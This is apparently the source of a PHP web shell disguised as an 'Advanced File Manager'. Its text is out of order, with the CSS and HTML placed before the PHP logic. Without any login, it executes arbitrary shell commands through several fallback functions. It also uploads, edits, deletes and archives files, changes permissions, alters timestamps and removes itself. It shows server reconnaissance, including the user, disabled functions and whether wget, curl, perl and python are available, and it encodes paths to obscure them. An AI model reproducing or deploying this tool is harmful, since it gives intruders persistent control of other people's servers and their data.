var(--border-color);padding:12px;line-height:1.5;font-size:13px;resize:vertical}.editor-info{margin-bottom:10px;font-size:11px;color:var(--text-muted);font-family:var(--font-mono)}#modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background-color:var(--bg-overlay);z-index:999;display:none;align-items:center;justify-content:center;animation:fadeIn .3s}#modal-box{width:90%;max-width:500px}#terminal-modal{position:fixed;top:0;left:0;width:100%;height:100%;background-color:var(--bg-overlay);z-index:1000;display:none;align-items:center;justify-content:center;animation:fadeIn .3s}#terminal-modal .card{width:min(95vw,1000px);max-height:90vh;padding:0;position:relative;display:flex;flex-direction:column}.terminal-header{padding:16px 20px;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;align-items:center;flex-shrink:0}.terminal-header h3{margin:0;font-size:16px;font-weight:600}.terminal-close-btn{background:var(--color-red);color:#fff;border:none;padding:6px 12px;border-radius:var(--radius-small);cursor:pointer;font-weight:500;font-size:12px}.terminal-close-btn:hover{background:#d32f2f}.command-history{max-height:120px;overflow-y:auto;padding:8px 12px;background-color:#0d1117;border-bottom:1px solid var(--border-color);flex-shrink:0}.history-item{padding:4px 8px;cursor:pointer;border-radius:var(--radius-small);font-size:11px;color:var(--text-muted);margin:2px 0;font-family:var(--font-mono);transition:all var(--transition-fast)}.history-item:hover{background-color:var(--bg-hover);color:var(--text-primary)}.terminal-container{font-family:var(--font-mono);background-color:#0d1117;border-radius:0 0 var(--radius-base) var(--radius-base);flex:1;display:flex;flex-direction:column;min-height:0}.terminal-output{flex:1;overflow-y:auto;padding:12px;background-color:#0d1117;white-space:pre-wrap;word-break:break-word;font-size:12px;line-height:1.4;color:#f0f6fc;min-height:200px}.terminal-input-container{display:flex;padding:8px 12px;background-color:#161b22;border-top:1px solid var(--border-color);border-radius:0 0 var(--radius-base) var(--radius-base);flex-shrink:0}.terminal-input{flex:1;background-color:#0d1117;color:#f0f6fc;border:1px solid var(--border-color);padding:6px 10px;font-family:var(--font-mono);font-size:12px;border-radius:var(--radius-small)}.terminal-send{margin-left:8px;padding:6px 12px;font-size:12px}.context-menu{position:fixed;background-color:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-small);padding:4px 0;box-shadow:0 8px 16px rgba(0,0,0,.6);z-index:1001;min-width:160px;display:none}.context-menu-item{padding:8px 12px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px;transition:background-color var(--transition-fast)}.context-menu-item:hover{background-color:var(--bg-hover)}.context-menu-item svg{width:14px;height:14px;fill:var(--text-secondary)}.no-results{text-align:center;padding:40px;color:var(--text-muted);font-style:italic}.top-control-bar{display:flex;justify-content:space-between;align-items:center;background-color:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-base);padding:12px 20px;margin-bottom:16px;box-shadow:var(--shadow-subtle)}.fm-branding{font-size:16px;font-weight:700;color:var(--accent-primary)}.top-buttons{display:flex;gap:8px}.top-buttons a{background-color:var(--bg-main);color:var(--text-primary);padding:6px 12px;border-radius:var(--radius-small);font-weight:500;font-size:12px;transition:all var(--transition-fast);border:1px solid var(--border-color);cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:4px}.top-buttons a:hover{background-color:var(--accent-primary);color:var(--bg-main);border-color:var(--accent-primary)}.top-buttons svg{width:14px;height:14px;fill:currentColor}.danger-btn{background-color:var(--color-red)!important;color:#fff!important;border-color:var(--color-red)!important}.danger-btn:hover{background-color:#d32f2f!important;border-color:#d32f2f!important}.command-container-three-col{display:flex;gap:20px;justify-content:space-between;align-items:flex-start}.execute-section,.navigate-section,.openfile-section{flex:1;min-width:200px;display:flex;flex-direction:column}.command-container-three-col label{font-size:12px;font-weight:600;color:var(--text-secondary);margin-bottom:8px;display:block}.command-container-three-col button,.command-container-three-col input[type=text]{font-family:var(--font-mono);font-size:13px;padding:8px 12px;box-sizing:border-box;height:38px;border-radius:var(--radius-small);border:1px solid var(--border-color);background-color:var(--bg-main);color:var(--text-primary);width:100%}.command-container-three-col input[type=text]:focus{border-color:var(--accent-primary);outline:0}.command-container-three-col button{background-color:var(--accent-primary);color:#fff;border-color:var(--accent-primary);cursor:pointer;font-weight:500;margin-top:8px}.command-container-three-col button:hover{background-color:var(--accent-primary-hover);border-color:var(--accent-primary-hover)}.btn-small{padding:4px 8px;font-size:11px;border-radius:var(--radius-small);border:1px solid var(--border-color);background:var(--bg-main);color:var(--text-primary);cursor:pointer;transition:all var(--transition-fast)}.btn-small:hover{background:var(--accent-primary);color:#fff;border-color:var(--accent-primary)}.btn-small.danger:hover{background:#d32f2f;border-color:#d32f2f}.clear-output-btn{position:absolute;top:8px;right:8px;background:var(--color-red);color:#fff;border:none;padding:4px 8px;border-radius:var(--radius-small);font-size:10px;cursor:pointer;opacity:.7;transition:opacity .2s}.clear-output-btn:hover{opacity:1}@media (max-width:768px){.container{padding:8px}.action-forms{flex-direction:column}.nav-bar{flex-direction:column;align-items:stretch}.file-table{font-size:12px}.file-table td,.file-table th{padding:6px 8px}.col-date,.col-owner{display:none}.col-name{width:50%}.col-size{width:15%}.col-perms{width:15%}.col-actions{width:20%}.command-container-three-col{flex-direction:column;gap:16px}}</style></head><body><div class="container"id="app-container"><div class="top-control-bar"><div class="fm-branding"><strong>Advanced File Manager - Fixed & Stable</strong></div><div class="top-buttons"><a id="sec-info-btn">Sec. Info</a> <a id="terminal-btn"><?php echo $icons['terminal']; ?>Terminal </a><a id="self-remove-btn"class="danger-btn">Self Remove</a></div></div><div class="card server-info"><strong>System:</strong><?php echo php_uname(); ?><br><strong>User:</strong><?php echo"$user ($uid) Group: $group ($gid)"; ?><br><strong>Server IP:</strong><?php echo $_SERVER['SERVER_ADDR']; ?>| <strong>Your IP:</strong><?php echo $_SERVER['REMOTE_ADDR']; ?><br><strong>HDD:</strong><?php echo format_size($used_space).' / '.format_size($total_space).' (Free: '.format_size($free_space).')'; ?><br><strong>Safe Mode:</strong><?php echo(@ini_get(strtolower("safe_mode"))=='on')?"<span class='highlight'>ON</span>":"OFF"; ?>| <strong>Disabled:</strong><?php echo empty($disabled_functions)?"NONE":"<span class='highlight'>YES</span>"; ?><br><strong>PHP:</strong><?php echo PHP_VERSION; ?>| <strong>OS:</strong><?php echo PHP_OS; ?><br><?php foreach($server_checks as $name=>$status): ?><strong><?php echo $name; ?>:</strong><?php echo $status?"<span class='highlight'>ON</span>":"OFF"; ?>|<?php endforeach; ?></div><div class="nav-bar"><div class="path-bar"id="path-bar"></div><div class="nav-buttons"><a id="refresh-btn">Refresh</a> <a href="#<?php echo basezero_encoder($script_dir); ?>"><?php echo $icons['home']; ?>Home</a></div></div><div id="message-container"><?php if($message): ?><div class="message<?php echo(strpos(strtolower($message),'error')!==false)?'error':''; ?>"><?php echo htmlspecialchars($message); ?></div><?php endif; ?></div><div id="main-content"><div id="listing-view"><div class="card"><div class="action-forms"><form method="POST"enctype="multipart/form-data"><div class="form-group"><input name="current_dir"type="hidden"class="form_current_dir"> <input name="upload_file[]"type="file"multiple required> <button type="submit">Upload</button></div></form><form method="POST"><div class="form-group"><input name="action"type="hidden"value="create_file"> <input name="current_dir"type="hidden"class="form_current_dir"> <input name="filename"placeholder="New file..."required> <button type="submit">Create File</button></div></form><form method="POST"><div class="form-group"><input name="action"type="hidden"value="create_dir"> <input name="current_dir"type="hidden"class="form_current_dir"> <input name="dirname"placeholder="New directory..."required> <button type="submit">Create Dir</button></div></form></div></div><div class="card"><div class="command-container-three-col"><div class="execute-section"><form method="POST"style="display:flex;flex-direction:column"><label>Execute:</label> <input name="action"type="hidden"value="execute_cmd"> <input name="current_dir"type="hidden"class="form_current_dir"> <input name="c"placeholder="Quick command execution..."> <button type="submit">Run</button></form></div><div class="navigate-section"><label>Navigate:</label> <input id="path-input"placeholder="Enter path..."> <button type="button"id="path-go-btn">Go</button></div><div class="openfile-section"><label>Open File:</label> <input id="file-path-input"placeholder=""> <button type="button"id="file-open-btn">Open</button></div></div><?php if(isset($_SESSION['cmd_output'])): ?><div style="position:relative"><pre style="background:#0d1117;color:#f0f6fc;padding:12px;border-radius:var(--radius-small);margin-top:12px;white-space:pre-wrap;word-break:break-word;font-family:var(--font-mono);font-size:12px;position:relative">
+<?php error_reporting(0);@ini_set('display_errors',0);@ini_set('default_charset','UTF-8');header('Content-Type: text/html; charset=UTF-8');if(!function_exists('json_encode')){function json_encode($data){switch(gettype($data)){case 'NULL':return 'null';case 'boolean':return $data?'true':'false';case 'integer':case 'double':return $data;case 'string':return '"'.addcslashes($data,"\\\"\n\r\t/").'"';case 'array':if(array_keys($data)===range(0,count($data)-1)){$output=array();foreach($data as $value){$output[]=json_encode($value);}return '['.implode(',',$output).']';}else{$output=array();foreach($data as $key=>$value){$output[]=json_encode(strval($key)).':'.json_encode($value);}return '{'.implode(',',$output).'}';}default:return 'null';}}}if(!function_exists('json_decode')){function json_decode($json,$assoc=false){if($json==='null')return null;if($json==='true')return true;if($json==='false')return false;if(is_numeric($json))return floatval($json);if($json[0]==='"')return stripslashes(substr($json,1,-1));if($json[0]==='{'||$json[0]==='['){$json=str_replace(array('null','true','false'),array('NULL','TRUE','FALSE'),$json);$json=preg_replace('/([{,])(\s*)([^":\s]+)(\s*):/','$1$2"$3"$4:',$json);$result=@eval('return '.$json.';');return $result;}return null;}}if(!function_exists('file_put_contents')){function file_put_contents($filename,$data,$flags=0){$mode=($flags&8)?'a':'w';$fp=fopen($filename,$mode);if(!$fp)return false;if($flags&1)flock($fp,2);$bytes=fwrite($fp,$data);if($flags&1)flock($fp,3);fclose($fp);return $bytes;}}if(!defined('PHP_OS_FAMILY')){if(strtoupper(substr(PHP_OS,0,3))==='WIN'){define('PHP_OS_FAMILY','Windows');}elseif(strtoupper(substr(PHP_OS,0,6))==='DARWIN'){define('PHP_OS_FAMILY','Darwin');}else{define('PHP_OS_FAMILY','Linux');}}if(!function_exists('mb_detect_encoding')){function mb_detect_encoding($str,$encoding_list=null,$strict=false){if(function_exists('iconv')){$encodings=array('UTF-8','ASCII','ISO-8859-1','Windows-1252');foreach($encodings as $encoding){if(@iconv($encoding,$encoding,$str)===$str){return $encoding;}}}return 'UTF-8';}}if(!function_exists('mb_convert_encoding')){function mb_convert_encoding($str,$to_encoding,$from_encoding=null){if(function_exists('iconv')&&$from_encoding){return@iconv($from_encoding,$to_encoding,$str);}return $str;}}if(!function_exists('mb_check_encoding')){function mb_check_encoding($str,$encoding=null){if(!$encoding)$encoding='UTF-8';if(function_exists('iconv')){return@iconv($encoding,$encoding,$str)===$str;}return true;}}define('BASEZERO_ALPHABET','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789');session_start();$script_dir=__DIR__;$isWindows=(PHP_OS_FAMILY==='Windows');function basezero_encoder($input){$alphabet=BASEZERO_ALPHABET;$base=strlen($alphabet);$output='';$len=strlen($input);for($i=0;$i<$len;$i++){$val=ord($input[$i]);$output.=$alphabet[(int)($val/$base)].$alphabet[$val%$base];}return $output;}function basezero_decoder($input){if(strlen($input)%2!=0)return false;$alphabet=BASEZERO_ALPHABET;$base=strlen($alphabet);$output='';$map=array_flip(str_split($alphabet));for($i=0;$i<strlen($input);$i+=2){if(!isset($map[$input[$i]])||!isset($map[$input[$i+1]]))return false;$val=($map[$input[$i]]*$base)+$map[$input[$i+1]];$output.=chr($val);}return $output;}function normalize_path($path){return str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$path);}function get_parent_directory($path){$parent=dirname($path);return($parent!==$path&&$parent!=='.')?$parent:null;}function format_size($bytes){if($bytes===false||!is_numeric($bytes))return 'N/A';$units=array('B','KB','MB','GB','TB');$i=0;while($bytes>=1024&&$i<4){$bytes/=1024;$i++;}return round($bytes,2).' '.$units[$i];}function get_permissions($file){clearstatcache(true,$file);$perms=fileperms($file);if($perms===false)return '----';return decoct($perms&0777);}function get_owner_info($path){global $isWindows;if($isWindows){return 'system';}if(function_exists('posix_getpwuid')&&file_exists($path)){$owner_info=@posix_getpwuid(@fileowner($path));$group_info=@posix_getgrgid(@filegroup($path));$owner=$owner_info?$owner_info['name']:@fileowner($path);$group=$group_info?$group_info['name']:@filegroup($path);return $owner.':'.$group;}else{return(file_exists($path)?@fileowner($path).':'.@filegroup($path):'?:?');}}function get_file_content_mixed($file){if(!is_readable($file)||!is_file($file)){return false;}$filesize=filesize($file);if($filesize===false)return false;$max_size=10*1024*1024;if($filesize>$max_size){return array('error'=>true,'message'=>"File too large to edit (".format_size($filesize)."). Maximum: ".format_size($max_size),'type'=>'error');}$content=file_get_contents($file);if($content===false)return false;$printable_count=0;$content_length=strlen($content);$check_length=min($content_length,1024);for($i=0;$i<$check_length;$i++){$char=ord($content[$i]);if(($char>=32&&$char<=126)||$char==9||$char==10||$char==13){$printable_count++;}}$printable_ratio=$check_length>0?($printable_count/$check_length):0;if($printable_ratio>0.5){if(function_exists('mb_detect_encoding')){$detected=mb_detect_encoding($content,array('UTF-8','ASCII','ISO-8859-1','Windows-1252'),true);if($detected&&$detected!=='UTF-8'){$content=mb_convert_encoding($content,'UTF-8',$detected);}}return array('content'=>$content,'type'=>'mixed','size'=>$filesize,'encoding'=>'raw','printable_ratio'=>round($printable_ratio*100,1));}else{return array('content'=>bin2hex($content),'type'=>'binary','size'=>$filesize,'encoding'=>'hex','printable_ratio'=>round($printable_ratio*100,1));}}function save_file_content_mixed($file,$content,$file_type='mixed',$encoding='raw'){if($file_type==='binary'&&$encoding==='hex'){if(strlen($content)%2!==0){return false;}$binary_content=@pack('H*',$content);if($binary_content===false){return false;}return file_put_contents($file,$binary_content,LOCK_EX)!==false;}else{if(function_exists('mb_check_encoding')){if(!mb_check_encoding($content,'UTF-8')){$content=mb_convert_encoding($content,'UTF-8','auto');}}return file_put_contents($file,$content,LOCK_EX)!==false;}}function execute_command($command,$working_directory=null){$original_dir=null;if($working_directory&&is_dir($working_directory)){$original_dir=getcwd();chdir($working_directory);}$command=$command.' 2>&1';$output='';$methods=array('shell_exec','exec','system','passthru','popen');foreach($methods as $method){if(!function_exists($method))continue;try{switch($method){case 'shell_exec':$output=@shell_exec($command);break;case 'exec':$exec_output=array();@exec($command,$exec_output);$output=implode("\n",$exec_output);break;case 'system':ob_start();@system($command);$output=ob_get_clean();break;case 'passthru':ob_start();@passthru($command);$output=ob_get_clean();break;case 'popen':$handle=@popen($command,'r');if($handle){while(!feof($handle)){$output.=fread($handle,4096);}pclose($handle);}break;}if($output!==null&&$output!==''){if($original_dir)chdir($original_dir);return array('success'=>true,'output'=>$output,'method'=>$method);}}catch(Exception $e){continue;}}if($original_dir)chdir($original_dir);return array('success'=>false,'output'=>'All command execution methods failed or are disabled.','method'=>'none');}function create_tar_gz($files,$archive_name,$current_dir){try{$archive_path=$current_dir.DIRECTORY_SEPARATOR.$archive_name.'.tar';if(!class_exists('PharData')){return false;}$phar=new PharData($archive_path);$added_files=0;foreach($files as $file_path){if(!file_exists($file_path))continue;if(is_dir($file_path)){$phar->buildFromDirectory($file_path,'/./');}else{$phar->addFile($file_path,basename($file_path));}$added_files++;}if($added_files===0){@unlink($archive_path);return false;}$phar->compress(Phar::GZ);@unlink($archive_path);return true;}catch(Exception $e){@unlink($archive_path);@unlink($archive_path.'.gz');return false;}}function delete_recursive($path){if(is_file($path)||is_link($path))return unlink($path);if(!is_dir($path))return false;$files=array_diff(scandir($path),array('.','..'));foreach($files as $file)delete_recursive($path.DIRECTORY_SEPARATOR.$file);return rmdir($path);}function copy_recursive($source,$dest){if(is_file($source))return copy($source,$dest);if(!is_dir($dest))mkdir($dest,0755,true);$files=array_diff(scandir($source),array('.','..'));foreach($files as $file)copy_recursive($source.DIRECTORY_SEPARATOR.$file,$dest.DIRECTORY_SEPARATOR.$file);return true;}function compare_file_names($a,$b){return strcasecmp($a['name'],$b['name']);}function get_file_list($dir){$items=array();$parent=get_parent_directory($dir);if($parent){$items[]=array('name'=>'..','type'=>'dir','path'=>$parent,'size'=>'','owner'=>'','perms'=>'','modified'=>'','is_parent'=>true,'permission_status'=>'readable');}$files=@scandir($dir);if(!$files)return $items;$dirs=array();$regular_files=array();foreach($files as $file){if($file==='.'||$file==='..')continue;$full_path=$dir.DIRECTORY_SEPARATOR.$file;$readable=is_readable($full_path);$writable=is_writable($full_path);$perm_status=!$readable?'denied':($writable?'writable':'readable');$item=array('name'=>$file,'path'=>$full_path,'owner'=>$readable?get_owner_info($full_path):'N/A','perms'=>$readable?get_permissions($full_path):'----','modified'=>$readable?date('Y-m-d H:i',@filemtime($full_path)):'N/A','is_parent'=>false,'permission_status'=>$perm_status);if(is_dir($full_path)){$item['type']='dir';$item['size']='';$dirs[]=$item;}else{$item['type']='file';$item['size']=$readable?format_size(@filesize($full_path)):'N/A';$item['is_zip']=in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),array('zip','rar','7z','tar','gz'));$regular_files[]=$item;}}usort($dirs,'compare_file_names');usort($regular_files,'compare_file_names');return array_merge($items,$dirs,$regular_files);}if(!isset($_SESSION['cmd_history'])){$_SESSION['cmd_history']=array();}if(!function_exists('posix_getegid')){$user=function_exists('get_current_user')?@get_current_user():'unknown';$user=$user?$user:'unknown';$uid=function_exists('getmyuid')?@getmyuid():'?';$uid=$uid?$uid:'?';$gid=function_exists('getmygid')?@getmygid():'?';$gid=$gid?$gid:'?';$group="?";}else{$uid_data=@posix_getpwuid(@posix_geteuid());$gid_data=@posix_getgrgid(@posix_getegid());$user=$uid_data?$uid_data['name']:'unknown';$uid=$uid_data?$uid_data['uid']:'?';$group=$gid_data?$gid_data['name']:'?';$gid=$gid_data?$gid_data['gid']:'?';}$server_checks=array('MySQL'=>function_exists('mysql_connect')||function_exists('mysqli_connect')||class_exists('PDO'),'Perl'=>!empty(@shell_exec('perl -v 2>&1')),'Python'=>!empty(@shell_exec('python --version 2>&1'))||!empty(@shell_exec('python3 --version 2>&1')),'WGET'=>!empty(@shell_exec('wget --version 2>&1')),'CURL'=>function_exists('curl_version'));$ajax_action=isset($_GET['action'])?$_GET['action']:'';if($ajax_action==='list'||$ajax_action==='get_content'||$ajax_action==='terminal_cmd'||$ajax_action==='open_file_by_path'){header('Content-Type: application/json; charset=UTF-8');if($ajax_action==='open_file_by_path'){$file_path=isset($_POST['file_path'])?trim($_POST['file_path']):'';$current_path=isset($_POST['current_path'])?normalize_path($_POST['current_path']):getcwd();if(empty($file_path)){echo json_encode(['success'=>false,'message'=>'Please enter a file path.']);exit;}if(substr($file_path,0,1)!=='/'&&substr($file_path,1,1)!==':'){$full_path=$current_path.DIRECTORY_SEPARATOR.$file_path;}else{$full_path=$file_path;}$full_path=normalize_path($full_path);if(!file_exists($full_path)){echo json_encode(['success'=>false,'message'=>"File not found: $file_path"]);exit;}if(is_dir($full_path)){echo json_encode(['success'=>false,'message'=>"Path is a directory, not a file: $file_path"]);exit;}if(!is_readable($full_path)){echo json_encode(['success'=>false,'message'=>"File is not readable: $file_path"]);exit;}$result=get_file_content_mixed($full_path);if($result===false||isset($result['error'])){echo json_encode(['success'=>false,'message'=>'Could not read file content.']);exit;}echo json_encode(['success'=>true,'action'=>'open_editor','file_path'=>$full_path,'filename'=>basename($full_path),'content'=>$result['content'],'file_type'=>$result['type'],'file_size'=>$result['size'],'encoding'=>$result['encoding'],'printable_ratio'=>isset($result['printable_ratio'])?$result['printable_ratio']:null,'permissions'=>get_permissions($full_path),'owner'=>get_owner_info($full_path),'modified'=>date('Y-m-d H:i',filemtime($full_path))]);exit;}if($ajax_action==='terminal_cmd'){$command=isset($_POST['c'])?trim($_POST['c']):'';$current_path=isset($_POST['current_path'])?normalize_path($_POST['current_path']):getcwd();if(empty($command)){echo json_encode(array('success'=>false,'output'=>'No command provided.'));exit;}if(!in_array($command,$_SESSION['cmd_history'])){array_unshift($_SESSION['cmd_history'],$command);$_SESSION['cmd_history']=array_slice($_SESSION['cmd_history'],0,50);}$result=execute_command($command,$current_path);$result['history']=$_SESSION['cmd_history'];echo json_encode($result);exit;}if($ajax_action==='list'){$raw_path=isset($_GET['path'])?$_GET['path']:'';$path=$raw_path?basezero_decoder($raw_path):getcwd();if(!$path){echo json_encode(array('success'=>false,'message'=>'Path decoding failed'));exit;}$path=str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$path);if(!file_exists($path)){echo json_encode(array('success'=>false,'message'=>"Path does not exist: '$path'"));exit;}if(!is_dir($path)){echo json_encode(array('success'=>false,'message'=>"Not a directory: '$path'"));exit;}$path_status=!is_readable($path)?'denied':(is_writable($path)?'writable':'readable');$files_data=get_file_list($path);$breadcrumbs=array();if($isWindows){$normalized_path=str_replace('/',DIRECTORY_SEPARATOR,$path);$parts=explode(DIRECTORY_SEPARATOR,$normalized_path);$built_path='';foreach($parts as $i=>$part){if(empty($part))continue;if($i===0&&preg_match('/^[A-Za-z]:$/',$part)){$built_path=$part.DIRECTORY_SEPARATOR;$breadcrumbs[]=array('name'=>$part,'path'=>$built_path);}else{$built_path.=($built_path===''||substr($built_path,-1)===DIRECTORY_SEPARATOR)?$part:DIRECTORY_SEPARATOR.$part;$breadcrumbs[]=array('name'=>$part,'path'=>$built_path);}}}else{$parts=explode('/',$path);$built_path='';foreach($parts as $part){if(empty($part))continue;$built_path.='/'.$part;$breadcrumbs[]=array('name'=>$part,'path'=>$built_path);}}$clipboard=isset($_COOKIE['fm_clipboard'])?json_decode(stripslashes($_COOKIE['fm_clipboard']),true):null;echo json_encode(array('success'=>true,'path'=>array('current'=>$path,'permission_status'=>$path_status,'breadcrumbs'=>$breadcrumbs,'is_windows'=>$isWindows),'files'=>$files_data,'clipboard'=>$clipboard,'user'=>$user));exit;}if($ajax_action==='get_content'){$path=isset($_GET['path'])?basezero_decoder($_GET['path']):'';if(!$path||!file_exists($path)){echo json_encode(array('success'=>false,'message'=>'File not found.'));exit;}$result=get_file_content_mixed($path);if($result===false){echo json_encode(array('success'=>false,'message'=>'Could not read file.'));exit;}if(isset($result['error'])){echo json_encode(array('success'=>false,'message'=>$result['message']));exit;}echo json_encode(array('success'=>true,'content'=>$result['content'],'file_type'=>$result['type'],'file_size'=>$result['size'],'encoding'=>$result['encoding'],'printable_ratio'=>isset($result['printable_ratio'])?$result['printable_ratio']:null,'permissions'=>get_permissions($path),'owner'=>get_owner_info($path),'modified'=>date('Y-m-d H:i',filemtime($path))));exit;}}$message='';if($_SERVER['REQUEST_METHOD']==='POST'){$current_dir=isset($_POST['current_dir'])?normalize_path($_POST['current_dir']):getcwd();chdir($current_dir);$action=isset($_POST['action'])?$_POST['action']:'';$file=isset($_POST['file'])?normalize_path($_POST['file']):'';$selected_files=isset($_POST['selected_files'])?array_map('normalize_path',$_POST['selected_files']):array();$bulk_action=isset($_POST['bulk_action'])?$_POST['bulk_action']:'';$clipboard=isset($_COOKIE['fm_clipboard'])?json_decode(stripslashes($_COOKIE['fm_clipboard']),true):null;$redirect_hash=basezero_encoder($current_dir);if(isset($_POST['ajax'])){header('Content-Type: application/json; charset=UTF-8');$response=array('success'=>false,'message'=>'Unknown error.');if($action==='edit'&&$file&&isset($_POST['content'])){$file_type=isset($_POST['file_type'])?$_POST['file_type']:'mixed';$encoding=isset($_POST['encoding'])?$_POST['encoding']:'raw';if(save_file_content_mixed($file,$_POST['content'],$file_type,$encoding)){$response=array('success'=>true,'message'=>'File saved successfully.');}else{$response=array('success'=>false,'message'=>'Error: Unable to save file.');}}if(!empty($bulk_action)){$new_clipboard=$clipboard;if($bulk_action==='paste'&&$clipboard){$count=0;foreach($clipboard['sources']as $source){if(!file_exists($source))continue;$dest=$current_dir.DIRECTORY_SEPARATOR.basename($source);if($clipboard['action']==='copy'){if(copy_recursive($source,$dest))$count++;}elseif($clipboard['action']==='move'){if(rename($source,$dest))$count++;}}setcookie('fm_clipboard','',time()-3600,"/");$new_clipboard=null;$response=array('success'=>true,'message'=>"$count item(s) pasted.");}elseif(!empty($selected_files)){switch($bulk_action){case 'delete':$count=0;foreach($selected_files as $f)if(delete_recursive($f))$count++;$response=array('success'=>true,'message'=>"$count item(s) deleted.");break;case 'copy':case 'move':$clipboard_data=array('action'=>$bulk_action,'sources'=>$selected_files);setcookie('fm_clipboard',json_encode($clipboard_data),time()+3600,"/");$new_clipboard=$clipboard_data;$response=array('success'=>true,'message'=>count($selected_files)." item(s) added to clipboard.");break;case 'compress':$archive_name='archive-'.date('Y-m-d-His');if(create_tar_gz($selected_files,$archive_name,$current_dir)){$response=array('success'=>true,'message'=>"Created archive: {$archive_name}.tar.gz");}else{$response=array('success'=>false,'message'=>'Error: Could not create TAR.GZ archive. PharData may not be available.');}break;case 'download':$zip_name='download-'.date('Y-m-d-His').'.zip';$zip_path=$current_dir.DIRECTORY_SEPARATOR.$zip_name;try{$zip=new PharData($zip_path);$added_files=0;foreach($selected_files as $file_path){if(!file_exists($file_path))continue;if(is_dir($file_path)){$zip->buildFromDirectory($file_path,'/./');}else{$zip->addFile($file_path,basename($file_path));}$added_files++;}if($added_files>0){$response=array('success'=>true,'message'=>"Download ready: {$zip_name}",'download_file'=>$zip_name);}else{@unlink($zip_path);$response=array('success'=>false,'message'=>'No files to download.');}}catch(Exception $e){$response=array('success'=>false,'message'=>'Could not create download archive: '.$e->getMessage());}break;}}$response['clipboard']=$new_clipboard;}echo json_encode($response);exit;}if(isset($_FILES['upload_file'])){$uploaded=0;$errors=0;if(is_array($_FILES['upload_file']['name'])){for($i=0;$i<count($_FILES['upload_file']['name']);$i++){if($_FILES['upload_file']['error'][$i]===UPLOAD_ERR_OK){$target_file=$current_dir.DIRECTORY_SEPARATOR.basename($_FILES['upload_file']['name'][$i]);if(move_uploaded_file($_FILES['upload_file']['tmp_name'][$i],$target_file)){$uploaded++;}else{$errors++;}}else{$errors++;}}if($uploaded>0){$message="$uploaded file(s) uploaded successfully.";if($errors>0){$message.=" $errors file(s) failed.";}}else{$message="Error: No files could be uploaded.";}}else{if($_FILES['upload_file']['error']===UPLOAD_ERR_OK){$target_file=$current_dir.DIRECTORY_SEPARATOR.basename($_FILES['upload_file']['name']);if(move_uploaded_file($_FILES['upload_file']['tmp_name'],$target_file)){$message="File uploaded successfully.";}else{$message="Error: Unable to upload file.";}}else{$message="Error: Upload failed.";}}}if($action==='self_remove'&&isset($_POST['confirm'])&&$_POST['confirm']==='yes'){$script_file=__FILE__;if(unlink($script_file)){echo json_encode(array('success'=>true,'message'=>'File manager deleted.'));}else{echo json_encode(array('success'=>false,'message'=>'Could not delete file manager.'));}exit;}switch($action){case 'rename':if($file&&isset($_POST['new_name'])){$file_dir=dirname($file);$new_name=trim($_POST['new_name']);$new_path=$file_dir.DIRECTORY_SEPARATOR.$new_name;if(rename($file,$new_path)){$message="Renamed successfully.";}else{$message="Error: Unable to rename. Check permissions and ensure the new name doesn't already exist.";}}break;case 'chmod':if($file&&isset($_POST['perms'])&&!$isWindows){$perms=trim($_POST['perms']);if(preg_match('/^0?([0-7]{3,4})$/',$perms,$matches)){$desired_perms=octdec('0'.$matches[1]);$old_umask=umask(0);$chmod_result=chmod($file,$desired_perms);umask($old_umask);if($chmod_result){clearstatcache(true,$file);$actual_perms=decoct(fileperms($file)&0777);if($actual_perms===$matches[1]){$message="Permissions changed to $actual_perms successfully.";}else{$message="Permissions changed to $actual_perms (system constraints may apply).";}}else{$message="Error: Unable to change permissions. Check file ownership and server privileges.";}}else{$message="Error: Invalid permission format. Use 3-4 octal digits (e.g., 644, 0755).";}}elseif($isWindows){$message="Chmod has limited functionality on Windows. Windows uses ACLs instead of Unix permissions.";}break;case 'touch':if($file&&isset($_POST['datetime'])){if(touch($file,strtotime($_POST['datetime']))){$message="Timestamp updated successfully.";}else{$message="Error: Unable to update timestamp.";}}break;case 'create_file':if(!empty($_POST['filename'])){$new_file=$current_dir.DIRECTORY_SEPARATOR.$_POST['filename'];if(touch($new_file)){$message="File created successfully.";}else{$message="Error: Unable to create file.";}}break;case 'create_dir':if(!empty($_POST['dirname'])){$new_dir=$current_dir.DIRECTORY_SEPARATOR.$_POST['dirname'];if(mkdir($new_dir)){$message="Directory created successfully.";}else{$message="Error: Unable to create directory.";}}break;case 'execute_cmd':if(!empty($_POST['c'])){$result=execute_command($_POST['c'],$current_dir);$_SESSION['cmd_output']=$result['output'];}break;}if($message)$_SESSION['fm_message']=$message;header('Location: '.$_SERVER['PHP_SELF'].'#'.$redirect_hash);exit;}$action_get=isset($_GET['action'])?$_GET['action']:'';$file_get=isset($_GET['file'])?normalize_path($_GET['file']):'';if($action_get==='download'){if($file_get&&is_readable($file_get)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($file_get).'"');header('Content-Length: '.filesize($file_get));ob_clean();flush();readfile($file_get);exit;}}if(isset($_SESSION['fm_message'])){$message=$_SESSION['fm_message'];unset($_SESSION['fm_message']);}$total_space=@disk_total_space($isWindows?substr(getcwd(),0,3):"/");$free_space=@disk_free_space($isWindows?substr(getcwd(),0,3):"/");$used_space=$total_space-$free_space;$disabled_functions=@ini_get("disable_functions");$icons=array('dir'=>'<i class="fas fa-folder"></i>','file'=>'<i class="fas fa-file-alt"></i>','edit'=>'<i class="fas fa-edit"></i>','rename'=>'<i class="fas fa-i-cursor"></i>','chmod'=>'<i class="fas fa-shield-alt"></i>','touch'=>'<i class="fas fa-clock"></i>','download'=>'<i class="fas fa-download"></i>','terminal'=>'<i class="fas fa-terminal"></i>','home'=>'<i class="fas fa-home"></i>'); ?><!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>File Manager Pro - Modern Edition</title><link href="https://fonts.googleapis.com"rel="preconnect"><link href="https://fonts.gstatic.com"rel="preconnect"crossorigin><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" 